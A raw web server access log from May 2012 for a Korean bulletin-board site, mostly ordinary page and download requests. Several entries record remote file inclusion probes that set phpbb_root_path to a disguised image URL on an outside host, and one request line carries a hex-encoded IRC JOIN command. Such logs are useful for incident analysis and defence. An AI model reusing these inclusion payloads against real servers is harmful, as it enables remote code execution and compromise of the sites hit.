127.0.0.1 - - [03/May/2012:02:21:33 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
61.247.204.36 - - [03/May/2012:02:21:39 +0900] "GET /rg4_board/view.php?bbs_code=gifted_3&bd_num=1876 HTTP/1.1" 200 25961
124.2.44.105 - - [03/May/2012:02:21:51 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1693 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:22:09 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1705 HTTP/1.0" 200 206
61.247.204.35 - - [03/May/2012:02:22:22 +0900] "GET /rg4_board/view.php?bbs_code=open_7&bd_num=734&page=8 HTTP/1.1" 200 67089
124.2.44.105 - - [03/May/2012:02:22:38 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1706 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:23:09 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1712 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:23:17 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1721 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:23:21 +0900] "GET /rg4_board/write.php?&bbs_code=class_free&bd_num=2919&mode=modify HTTP/1.0" 200 198
124.2.44.105 - - [03/May/2012:02:23:40 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=2017 HTTP/1.0" 200 206
61.247.204.35 - - [03/May/2012:02:23:57 +0900] "GET %4a%4f%49%4e%20%23%21%78%21%20%65%31%6d%32%0d%0a/rg4_board/down.php?bbs_code=association&bd_num=3677&key=0&mode=down HTTP/1.1" 200 26112
124.2.44.105 - - [03/May/2012:02:24:09 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1981 HTTP/1.0" 200 206
61.247.204.37 - - [03/May/2012:02:24:34 +0900] "GET /rg4_board/slide.php?bbs_code=action&page=3 HTTP/1.1" 404 311
124.2.44.105 - - [03/May/2012:02:25:09 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=2018 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:02:25:32 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:02:25:33 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:02:25:34 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=2019 HTTP/1.0" 200 206
